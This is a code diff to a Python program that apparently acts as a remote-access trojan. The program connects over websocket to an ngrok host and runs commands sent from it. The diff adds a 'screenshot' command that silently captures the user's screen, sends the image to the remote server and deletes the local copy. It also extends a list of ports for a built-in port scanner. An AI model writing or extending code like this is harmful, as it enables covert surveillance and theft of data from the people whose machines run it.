@@ -17,6 +17,11 @@ def alert_message():
     messagebox.showinfo("Warrning", "Are U Sure You are Safe?")
     root.mainloop()
 
+import pyautogui
+def take_screenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save("screenshot.png")
+
 
 URL = "wss://broderick-hiplength-glamourously.ngrok-free.dev"
 async def main():
@@ -73,6 +78,10 @@ async def main():
                 elif commandlist[0] == 'alert':
                     alert_message()
                     await ws.send(b"Alert displayed")
+                elif commandlist[0] == 'screenshot':
+                    take_screenshot()
+                    await sendfile("screenshot.png")
+                    os.remove("screenshot.png")
                 else:
                     await ws.send(b"Unknown command")
         await myprocess()
@@ -122,7 +131,7 @@ def port_scan():
 
     print(f"\n Scanning ports on {target}...\n")
 
-    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389 ,544, 554,5900, 8080,8000, 8081,3000, 5000, 6379, 11211, 27017,5173, 6379,3000, 5000, 9000, 9200, 9300, 11211, 27017
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389 ,544, 554,5900, 8080,8000, 8081,3000, 5000, 6379, 11211, 27017,5173, 6379, 8080, 8081, 3000, 5000, 8000, 9000, 9200, 9300, 11211, 27017
                     ]
     open_ports = []
 
